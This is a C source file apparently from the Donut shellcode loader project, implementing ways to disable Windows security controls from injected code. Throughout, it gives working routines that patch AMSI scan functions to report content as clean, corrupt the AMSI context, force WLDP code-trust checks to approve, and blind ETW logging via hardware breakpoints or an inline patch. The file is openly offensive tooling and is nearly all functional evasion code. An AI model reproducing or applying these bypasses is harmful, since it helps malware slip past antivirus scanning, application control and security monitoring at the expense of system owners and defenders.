/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "bypass.h"

#if defined(_MSC_VER)
#define DONUT_NOINLINE __declspec(noinline)
#elif defined(__GNUC__)
#define DONUT_NOINLINE __attribute__((noinline))
#else
#define DONUT_NOINLINE
#endif

#if defined(BYPASS_AMSI_B) || defined(BYPASS_AMSI_C) || \
    defined(BYPASS_WLDP_B) || defined(BYPASS_ETW_B)

// Apply a small, exact patch to executable memory.
//
// The old implementation copied the body of a C "stub" function into the
// target API.  The length was calculated by subtracting two function
// addresses, so a compiler that inserted padding or reordered functions could
// copy unrelated bytes over the target and leave a large, recognizable stub
// behind.  It also ignored a failed VirtualProtect restore, which could leave
// a page permanently RWX.
//
// This helper only touches the requested range, verifies that the range is
// committed and belongs to a single readable region, and always tries to put
// the original page protection back.  If the restore fails we fall back to
// PAGE_EXECUTE_READ instead of leaving the page writable and executable.
static BOOL PatchCode(PDONUT_INSTANCE inst, LPVOID addr, const void *patch, DWORD len) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    old_prot = 0, tmp = 0;
    PBYTE                    end;

    if (inst == NULL || addr == NULL || patch == NULL || len == 0) return FALSE;

    if (inst->api.VirtualQuery(addr, &mbi, sizeof(mbi)) != sizeof(mbi)) return FALSE;
    if (mbi.State != MEM_COMMIT) return FALSE;
    if (mbi.Protect & (PAGE_NOACCESS | PAGE_GUARD)) return FALSE;

    end = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    if ((PBYTE)addr >= end) return FALSE;
    if ((PBYTE)addr + len > end) return FALSE;

    if (!inst->api.VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old_prot)) return FALSE;

    Memcpy(addr, patch, len);

    if (!inst->api.VirtualProtect(addr, len, old_prot, &tmp)) {
        // Never leave the patched page both writable and executable.
        inst->api.VirtualProtect(addr, len, PAGE_EXECUTE_READ, &tmp);
        return FALSE;
    }
    return TRUE;
}

// Build the patch bytes from immediates so they live in .text with the loader.
// A `static const BYTE[]` ends up in .rdata, which exe2h does not copy into the
// generated shellcode; referencing it from the stub would crash at runtime.
#define P64(a,b,c,d,e,f,g,h) \
  ((ULONG64)(BYTE)(a)         | ((ULONG64)(BYTE)(b) << 8)  | \
   ((ULONG64)(BYTE)(c) << 16) | ((ULONG64)(BYTE)(d) << 24) | \
   ((ULONG64)(BYTE)(e) << 32) | ((ULONG64)(BYTE)(f) << 40) | \
   ((ULONG64)(BYTE)(g) << 48) | ((ULONG64)(BYTE)(h) << 56))

static DONUT_NOINLINE BOOL PatchBytes(PDONUT_INSTANCE inst, LPVOID addr, ULONG64 lo, ULONG64 hi, DWORD len) {
    BYTE  patch[16];
    DWORD i;

    if (len > sizeof(patch)) return FALSE;

    for (i = 0; i < len && i < 8; i++) {
      patch[i] = (BYTE)(lo >> (i * 8));
    }
    for (; i < len && i < 16; i++) {
      patch[i] = (BYTE)(hi >> ((i - 8) * 8));
    }
    return PatchCode(inst, addr, patch, len);
}
#endif

#if defined(BYPASS_AMSI_A)
// This is where you may define your own AMSI bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
BOOL DisableAMSI(PDONUT_INSTANCE inst) {
  return TRUE;
}

#elif defined(BYPASS_AMSI_B)
// Minimal patches for the two AMSI entry points used by the CLR and script
// hosts.  Each patch sets the AMSI_RESULT out-parameter to AMSI_RESULT_CLEAN
// and returns S_OK.  The patches are exact byte sequences instead of copies of
// compiled C functions, so they cannot overrun the target function.
BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    HMODULE dll;
    LPVOID  cs;

    // try load amsi. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    dll = xGetLibAddress(inst, inst->amsi);
    if(dll == NULL) return TRUE;

    // resolve address of AmsiScanBuffer. if not found,
    // return FALSE because it should exist ...
    cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
    if(cs == NULL) return FALSE;

#if defined(_WIN64)
    // AmsiScanBuffer(HAMSICONTEXT, PVOID, ULONG, LPCWSTR, HAMSISESSION,
    // AMSI_RESULT*): result is the 6th argument at [rsp+30h] on entry.
    if(!PatchBytes(inst, cs,
        P64(0xC7,0x44,0x24,0x30,0x00,0x00,0x00,0x00),
        P64(0x31,0xC0,0xC3,0x00,0x00,0x00,0x00,0x00), 11))
      return FALSE;
#else
    // AmsiScanBuffer has six 32-bit arguments and returns with `ret 18h`; the
    // result pointer is the 6th argument at [esp+18h] on entry.
    if(!PatchBytes(inst, cs,
        P64(0xC7,0x44,0x24,0x18,0x00,0x00,0x00,0x00),
        P64(0x31,0xC0,0xC2,0x18,0x00,0x00,0x00,0x00), 13))
      return FALSE;
#endif

    // resolve address of AmsiScanString. if not found,
    // return FALSE because it should exist ...
    cs = xGetProcAddress(inst, dll, inst->amsiScanStr, 0);
    if(cs == NULL) return FALSE;

#if defined(_WIN64)
    // AmsiScanString(HAMSICONTEXT, LPCWSTR, LPCWSTR, HAMSISESSION,
    // AMSI_RESULT*): result is the 5th argument at [rsp+28h] on entry.
    return PatchBytes(inst, cs,
        P64(0xC7,0x44,0x24,0x28,0x00,0x00,0x00,0x00),
        P64(0x31,0xC0,0xC3,0x00,0x00,0x00,0x00,0x00), 11);
#else
    // AmsiScanString has five 32-bit arguments and returns with `ret 14h`; the
    // result pointer is the 5th argument at [esp+14h] on entry.
    return PatchBytes(inst, cs,
        P64(0xC7,0x44,0x24,0x14,0x00,0x00,0x00,0x00),
        P64(0x31,0xC0,0xC2,0x14,0x00,0x00,0x00,0x00), 13);
#endif
}

#elif defined(BYPASS_AMSI_C)
BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    HMODULE                    dll;
    PBYTE                      cs;
    DWORD                      i, scan_len;
    MEMORY_BASIC_INFORMATION   mbi;
    PBYTE                      end;

    // try load amsi. if unable to load, assume
    // it doesn't exist and return TRUE to indicate
    // it's okay to continue.
    dll = xGetLibAddress(inst, inst->amsi);
    if(dll == NULL) return TRUE;

    // resolve address of AmsiScanBuffer. if unable, return
    // FALSE because it should exist.
    cs = (PBYTE)xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
    if(cs == NULL) return FALSE;

    // The old loop scanned until it happened to find "amsi" and could read
    // past the end of the mapped image.  Only scan the first 255 bytes of the
    // function, and never cross the end of its committed region.
    if(inst->api.VirtualQuery(cs, &mbi, sizeof(mbi)) != sizeof(mbi)) return FALSE;
    if(mbi.State != MEM_COMMIT || (mbi.Protect & (PAGE_NOACCESS | PAGE_GUARD)))
      return FALSE;

    end = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    if(cs >= end) return FALSE;

    scan_len = (DWORD)(end - cs);
    if(scan_len > 255) scan_len = 255;

    for(i = 0; i + sizeof(DWORD) <= scan_len; i++) {
      // is it "amsi"?
      if(Memcmp(&cs[i], inst->amsi, sizeof(DWORD)) == 0) {
        DWORD signature = *(PDWORD)&cs[i];

        // change signature
        signature++;

        // set memory protection for write access, patch, and restore
        return PatchCode(inst, &cs[i], &signature, sizeof(signature));
      }
    }
    return FALSE;
}

#elif defined(BYPASS_AMSI_D)
// Attempt to find AMSI context in .data section of CLR.dll
// Could also scan PEB.ProcessHeap for this..
// Disabling AMSI via AMSI context is based on idea by Matt Graeber
// https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    LPVOID                   clr;
    BOOL                     disabled = FALSE;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, res, signature;
    SIZE_T                   j, vsize;
    PBYTE                    ds;
    MEMORY_BASIC_INFORMATION mbi;
    _PHAMSICONTEXT           ctx;

    // build the "amsi" DWORD without relying on unaligned/pointer casts
    Memcpy(&signature, inst->amsi, sizeof(signature));

    // get address of CLR.dll. if unable, this
    // probably isn't a dotnet assembly being loaded
    clr = inst->api.GetModuleHandleA(inst->clr);
    if(clr == NULL) return FALSE;

    dos = (PIMAGE_DOS_HEADER)clr;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader +
      nt->FileHeader.SizeOfOptionalHeader);

    // scan all writeable segments while disabled == FALSE
    for(i = 0;
        i < nt->FileHeader.NumberOfSections && !disabled;
        i++)
    {
      // if this section is writeable, assume it's data
      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
        vsize = sh[i].Misc.VirtualSize;

        // VirtualSize is unsigned; subtracting sizeof(ULONG_PTR) from a
        // smaller value used to underflow and scan gigabytes out of bounds.
        if (vsize < sizeof(ULONG_PTR)) continue;

        // scan section for pointers to the heap
        ds = RVA2VA (PBYTE, clr, sh[i].VirtualAddress);

        for(j = 0;
            j + sizeof(ULONG_PTR) <= vsize;
            j += sizeof(ULONG_PTR))
        {
          // get pointer
          ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
          // query if the pointer
          res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
          if(res != sizeof(mbi)) continue;

          // if it's a pointer to heap or stack
          if ((mbi.State   == MEM_COMMIT    ) &&
              (mbi.Type    == MEM_PRIVATE   ) &&
              (mbi.Protect == PAGE_READWRITE))
          {
            ctx = (_PHAMSICONTEXT)ptr;
            // check if it contains the signature
            if(ctx->Signature == signature) {
              // corrupt it
              ctx->Signature++;
              disabled = TRUE;
              break;
            }
          }
        }
      }
    }
    return disabled;
}
#endif

#if defined(BYPASS_WLDP_A)
// This is where you may define your own WLDP bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_WLDP_A defined.

BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    return TRUE;
}

#elif defined(BYPASS_WLDP_B)
BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    HMODULE wldp;
    LPVOID  cs;

    // try load wldp. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    wldp = xGetLibAddress(inst, inst->wldp);
    if(wldp == NULL) return TRUE;

    // resolve address of WldpQueryDynamicCodeTrust
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, wldp, inst->wldpQuery, 0);
    if(cs == NULL) return FALSE;

#if defined(_WIN64)
    // WldpQueryDynamicCodeTrust(HANDLE, PVOID, ULONG)
    if(!PatchBytes(inst, cs,
        P64(0x31,0xC0,0xC3,0x00,0x00,0x00,0x00,0x00),
        0, 3))
      return FALSE;
#else
    // three 32-bit arguments: ret 0Ch
    if(!PatchBytes(inst, cs,
        P64(0x31,0xC0,0xC2,0x0C,0x00,0x00,0x00,0x00),
        0, 5))
      return FALSE;
#endif

    // resolve address of WldpIsClassInApprovedList
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, wldp, inst->wldpIsApproved, 0);
    if(cs == NULL) return FALSE;

#if defined(_WIN64)
    // WldpIsClassInApprovedList(REFCLSID, PWLDP_HOST_INFORMATION, PBOOL,
    // DWORD): isApproved is the 3rd argument in r8.
    return PatchBytes(inst, cs,
        P64(0x41,0xC7,0x00,0x01,0x00,0x00,0x00,0x00),
        P64(0x31,0xC0,0xC3,0x00,0x00,0x00,0x00,0x00), 10);
#else
    // four 32-bit arguments: ret 10h; isApproved is at [esp+0Ch].
    return PatchBytes(inst, cs,
        P64(0xC7,0x44,0x24,0x0C,0x01,0x00,0x00,0x00),
        P64(0x31,0xC0,0xC2,0x10,0x00,0x00,0x00,0x00), 13);
#endif
}
#endif

#if defined(BYPASS_ETW_A)
// This is where you may define your own ETW bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
BOOL DisableETW(PDONUT_INSTANCE inst) {
    return TRUE;
}

#elif defined(BYPASS_ETW_B)

#ifndef STATUS_SINGLE_STEP
#define STATUS_SINGLE_STEP ((DWORD)0x80000004L)
#endif

// Marker stored alongside the breakpoint target in a spare debug register.
// The VEH handler uses it to distinguish our breakpoint from any EDR one.
#define ETW_BP_MAGIC ((ULONG_PTR)0x45545742) // "ETWB"

// Patchless ETW bypass:
//
//   * register a vectored exception handler
//   * arm an execute hardware breakpoint (Dr0/Dr2) on NtTraceEvent/EtwEventWrite
//   * when the CPU raises #DB, the handler fakes the function's return
//
// No bytes in ntdll (or any other module) are modified.  Hardware breakpoints
// are per-thread, so the handler is installed on the current thread and, when
// NtGetNextThread is available, on every other thread in the process.
static DONUT_NOINLINE LONG NTAPI EtwBreakpointHandler(PEXCEPTION_POINTERS pEx) {
    PCONTEXT  ctx;
    ULONG_PTR target;

    if (pEx == NULL || pEx->ExceptionRecord == NULL || pEx->ContextRecord == NULL)
        return EXCEPTION_CONTINUE_SEARCH;
    if (pEx->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    ctx = pEx->ContextRecord;

    // pair Dr0 (breakpoint) / Dr1 (target ^ magic)
    if ((ctx->Dr6 & 1) && ctx->Dr0 == (ctx->Dr1 ^ ETW_BP_MAGIC)) {
        target = (ULONG_PTR)ctx->Dr0;
    // pair Dr2 (breakpoint) / Dr3 (target ^ magic)
    } else if ((ctx->Dr6 & 4) && ctx->Dr2 == (ctx->Dr3 ^ ETW_BP_MAGIC)) {
        target = (ULONG_PTR)ctx->Dr2;
    } else {
        return EXCEPTION_CONTINUE_SEARCH;
    }

#ifdef _WIN64
    if ((ULONG_PTR)ctx->Rip != target) return EXCEPTION_CONTINUE_SEARCH;
    ctx->Rax = 0;                              // STATUS_SUCCESS / 0
    ctx->Rip = *(ULONG_PTR*)ctx->Rsp;          // return to caller
    ctx->Rsp += sizeof(ULONG_PTR);
#else
    if ((ULONG_PTR)ctx->Eip != target) return EXCEPTION_CONTINUE_SEARCH;
    ctx->Eax = 0;                              // STATUS_SUCCESS / 0
    ctx->Eip = *(DWORD*)ctx->Esp;              // return to caller
    // stdcall cleanup: return address + TRACEHANDLE/REGHANDLE (8 bytes)
    // + Flags (4) + FieldSize/UserDataCount (4) + Fields/UserData (4) = 0x14
    ctx->Esp += sizeof(DWORD) + 0x14;
#endif

    ctx->Dr6 = 0;
    return EXCEPTION_CONTINUE_EXECUTION;
}

// Choose a free debug-register pair and arm an execute breakpoint.  If both
// pairs are already in use by a debugger/EDR, leave the thread untouched.
static BOOL ArmEtwThread(PDONUT_INSTANCE inst, HANDLE hThread, ULONG_PTR target, BOOL current) {
    CONTEXT ctx;
    BOOL    ok;

    Memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!current) {
      if (inst->api.SuspendThread(hThread) == (DWORD)-1) return FALSE;
    }
    if (!inst->api.GetThreadContext(hThread, &ctx)) {
      if (!current) inst->api.ResumeThread(hThread);
      return FALSE;
    }

    // Check local and global enable bits for the whole pair.
    if ((ctx.Dr7 & 0xF) == 0) {
      // Dr0 = breakpoint address, Dr1 = target ^ magic
      ctx.Dr0 = target;
      ctx.Dr1 = target ^ ETW_BP_MAGIC;
      ctx.Dr7 &= ~((ULONG_PTR)0xF << 16);      // execute, 1 byte
      ctx.Dr7 |= 1;                            // L0
    } else if ((ctx.Dr7 & 0xF0) == 0) {
      // Dr2 = breakpoint address, Dr3 = target ^ magic
      ctx.Dr2 = target;
      ctx.Dr3 = target ^ ETW_BP_MAGIC;
      ctx.Dr7 &= ~((ULONG_PTR)0xF << 24);      // execute, 1 byte
      ctx.Dr7 |= (1 << 4);                     // L2
    } else {
      if (!current) inst->api.ResumeThread(hThread);
      return FALSE;
    }

    ctx.Dr6 = 0;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (current) {
      // NtContinue updates debug registers without emitting the
      // SetContextThread ETW event that SetThreadContext produces.
      ok = (inst->api.NtContinue(&ctx, FALSE) == 0);
    } else {
      ok = inst->api.SetThreadContext(hThread, &ctx);
      inst->api.ResumeThread(hThread);
    }
    if (ok) inst->etwThreads++;
    return ok;
}

// Remove our breakpoint pair (identified by the magic value) from a thread.
static void DisarmEtwThread(PDONUT_INSTANCE inst, HANDLE hThread, BOOL current) {
    CONTEXT ctx;
    BOOL    ours = FALSE;

    Memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!current) {
      if (inst->api.SuspendThread(hThread) == (DWORD)-1) return;
    }
    if (!inst->api.GetThreadContext(hThread, &ctx)) {
      if (!current) inst->api.ResumeThread(hThread);
      return;
    }

    if ((ctx.Dr7 & 1) && ctx.Dr0 == (ctx.Dr1 ^ ETW_BP_MAGIC)) {
      ctx.Dr0 = 0;
      ctx.Dr1 = 0;
      ctx.Dr7 &= ~(ULONG_PTR)0x3;   // L0 + G0
      ours = TRUE;
    }
    if ((ctx.Dr7 & (1 << 4)) && ctx.Dr2 == (ctx.Dr3 ^ ETW_BP_MAGIC)) {
      ctx.Dr2 = 0;
      ctx.Dr3 = 0;
      ctx.Dr7 &= ~((ULONG_PTR)0x3 << 4); // L2 + G2
      ours = TRUE;
    }
    if (!ours) {
      if (!current) inst->api.ResumeThread(hThread);
      return;
    }

    ctx.Dr6 = 0;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (current) {
      inst->api.NtContinue(&ctx, FALSE);
    } else {
      inst->api.SetThreadContext(hThread, &ctx);
      inst->api.ResumeThread(hThread);
    }
    if (inst->etwThreads > 0) inst->etwThreads--;
}

// Remove the breakpoints and the VEH handler before the loader releases the
// shellcode memory.
VOID DisableETWCleanup(PDONUT_INSTANCE inst) {
    HANDLE hThread = NULL, hNext;
    DWORD  current_tid, tid;
    NtGetNextThread_t ntGetNextThread;

    if (inst == NULL || inst->etwVeh == 0) return;

    current_tid = inst->api.GetCurrentThreadId();
    DisarmEtwThread(inst, inst->api.GetCurrentThread(), TRUE);

    ntGetNextThread = (NtGetNextThread_t)(ULONG_PTR)inst->etwNtGetNextThread;
    if (ntGetNextThread != NULL) {
      while (ntGetNextThread(inst->api.GetCurrentProcess(), hThread,
               THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
               THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
               0, 0, &hNext) == 0)
      {
        if (hThread != NULL) inst->api.CloseHandle(hThread);
        hThread = hNext;

        tid = inst->api.GetThreadId(hThread);
        if (tid == 0 || tid == current_tid) continue;
        DisarmEtwThread(inst, hThread, FALSE);
      }
      if (hThread != NULL) inst->api.CloseHandle(hThread);
    }

    // Only unregister the handler when every armed thread was disarmed.
    // Otherwise a stray #DB could jump into freed shellcode.
    if (inst->etwThreads == 0) {
      inst->api.RtlRemoveVectoredExceptionHandler((PVOID)(ULONG_PTR)inst->etwVeh);
      inst->etwVeh = 0;
    }
}
BOOL DisableETW(PDONUT_INSTANCE inst) {
    HMODULE           dll;
    LPVOID            cs, target, veh;
    NtGetNextThread_t ntGetNextThread;
    HANDLE            hThread = NULL, hNext;
    DWORD             current_tid, tid;
    BOOL              armed = FALSE;

    // already armed by an earlier call
    if (inst->etwVeh != 0) return TRUE;

    // get a handle to ntdll.dll
    dll = xGetLibAddress(inst, inst->ntdll);
    if (dll == NULL) return FALSE;

    // NtTraceEvent is the user->kernel transition used by every ETW write.
    target = xGetProcAddress(inst, dll, inst->etwTraceEvent, 0);
    if (target == NULL) {
      target = xGetProcAddress(inst, dll, inst->etwEventWrite, 0);
    }
    if (target == NULL) return FALSE;

    // Preferred: register a VEH and arm an execute hardware breakpoint.
    // This writes no bytes to ntdll or any other module.
    ntGetNextThread = (NtGetNextThread_t)xGetProcAddress(inst, dll, inst->ntGetNextThread, 0);

    veh = inst->api.RtlAddVectoredExceptionHandler(
            1, (PVECTORED_EXCEPTION_HANDLER)ADR(PVOID, EtwBreakpointHandler));
    if (veh != NULL) {
      inst->etwVeh             = (uint64_t)(ULONG_PTR)veh;
      inst->etwNtdll           = (uint64_t)(ULONG_PTR)dll;
      inst->etwNtGetNextThread = (uint64_t)(ULONG_PTR)ntGetNextThread;

      if (ArmEtwThread(inst, inst->api.GetCurrentThread(),
                       (ULONG_PTR)target, TRUE))
        armed = TRUE;

      current_tid = inst->api.GetCurrentThreadId();

      if (ntGetNextThread != NULL) {
        while (ntGetNextThread(inst->api.GetCurrentProcess(), hThread,
                 THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                 THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
                 0, 0, &hNext) == 0)
        {
          if (hThread != NULL) inst->api.CloseHandle(hThread);
          hThread = hNext;

          tid = inst->api.GetThreadId(hThread);
          if (tid == 0 || tid == current_tid) continue;
          if (ArmEtwThread(inst, hThread, (ULONG_PTR)target, FALSE))
            armed = TRUE;
        }
        if (hThread != NULL) inst->api.CloseHandle(hThread);
      }

      if (armed) return TRUE;

      // No thread could be armed (e.g. all debug-register pairs are in use).
      // Remove the handler and fall through to the inline patch.
      inst->api.RtlRemoveVectoredExceptionHandler((PVOID)(ULONG_PTR)inst->etwVeh);
      inst->etwVeh             = 0;
      inst->etwNtdll           = 0;
      inst->etwNtGetNextThread = 0;
    }

    // Fallback: inline patch of the syscall stub.  This is still useful on
    // systems where debug registers are unavailable or already occupied.
    cs = target;

#if defined(_WIN64)
    return PatchBytes(inst, cs,
        P64(0x31,0xC0,0xC3,0x00,0x00,0x00,0x00,0x00), 0, 3);
#else
    // 4 arguments, but TRACEHANDLE/REGHANDLE is 64-bit: ret 14h.
    return PatchBytes(inst, cs,
        P64(0x31,0xC0,0xC2,0x14,0x00,0x00,0x00,0x00), 0, 5);
#endif
}
#endif

#if !defined(BYPASS_ETW_B)
VOID DisableETWCleanup(PDONUT_INSTANCE inst) {
    (void)inst;
}
#endif
